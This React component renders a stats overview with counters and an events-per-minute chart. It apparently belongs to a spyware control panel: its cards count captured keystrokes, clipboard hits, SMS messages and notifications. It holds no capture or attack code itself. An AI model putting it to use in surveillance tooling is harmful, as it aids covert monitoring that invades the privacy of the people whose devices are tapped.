import { AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer } from 'recharts'
import type { TelemetryEntry } from '../hooks/useFirestore'

interface StatsProps {
  logs: TelemetryEntry[]
  loading: boolean
}

const STAT_CARDS = [
  { key: 'NOTIFICATION', label: 'Notifications', icon: '🔔', color: '#3b82f6' },
  { key: 'KEYLOG',       label: 'Keystrokes',    icon: '⌨',  color: '#ef4444' },
  { key: 'CLIPBOARD',    label: 'Clipboard Hits', icon: '📋', color: '#f59e0b' },
  { key: 'SMS',          label: 'SMS Captured',  icon: '✉',  color: '#22c55e' },
]

function buildChart(logs: TelemetryEntry[]) {
  const now = Date.now()
  return Array.from({ length: 12 }, (_, i) => {
    const start = now - (12 - i) * 60_000
    const end   = now - (11 - i) * 60_000
    const count = logs.filter(l => l.timestamp >= start && l.timestamp < end).length
    return {
      t: new Date(start).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      count,
    }
  })
}

export default function StatsOverview({ logs, loading }: StatsProps) {
  const data = buildChart(logs)

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 20, height: '100%' }}>
      {/* KPI Cards */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 12 }}>
        {STAT_CARDS.map(s => {
          const count = logs.filter(l => l.type === s.key).length
          return (
            <div key={s.key} style={{ padding: '16px 18px', borderRadius: 14, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 10 }}>
                <span style={{ fontSize: 20 }}>{s.icon}</span>
                <span style={{ fontSize: 9, fontWeight: 700, letterSpacing: '0.12em', color: '#334155', textTransform: 'uppercase' }}>Session</span>
              </div>
              {loading ? (
                <div className="shimmer" style={{ width: 48, height: 36, borderRadius: 6, marginBottom: 6 }} />
              ) : (
                <div style={{ fontSize: 36, fontWeight: 800, color: s.color, lineHeight: 1, marginBottom: 4 }}>{count}</div>
              )}
              <div style={{ fontSize: 12, color: '#475569' }}>{s.label}</div>
            </div>
          )
        })}
      </div>

      {/* Activity Chart */}
      <div style={{ flex: 1, padding: 18, borderRadius: 16, background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
        <div style={{ marginBottom: 14 }}>
          <h3 style={{ fontSize: 14, fontWeight: 600, color: '#cbd5e1', marginBottom: 2 }}>Event Activity</h3>
          <p style={{ fontSize: 11, color: '#475569' }}>Events per minute · last 12 minutes</p>
        </div>
        {loading ? (
          <div className="shimmer" style={{ borderRadius: 8, height: 160 }} />
        ) : (
          <ResponsiveContainer width="100%" height={160}>
            <AreaChart data={data}>
              <defs>
                <linearGradient id="grad" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="10%" stopColor="#3b82f6" stopOpacity={0.4} />
                  <stop offset="90%" stopColor="#3b82f6" stopOpacity={0} />
                </linearGradient>
              </defs>
              <XAxis dataKey="t" tick={{ fill: '#334155', fontSize: 10 }} axisLine={false} tickLine={false} />
              <YAxis hide allowDecimals={false} />
              <Tooltip
                contentStyle={{ background: '#0f1420', border: '1px solid #1e2a3a', borderRadius: 8, color: '#cbd5e1', fontSize: 12 }}
                cursor={{ stroke: 'rgba(59,130,246,0.2)' }}
              />
              <Area type="monotone" dataKey="count" stroke="#3b82f6" strokeWidth={2} fill="url(#grad)" />
            </AreaChart>
          </ResponsiveContainer>
        )}
      </div>
    </div>
  )
}
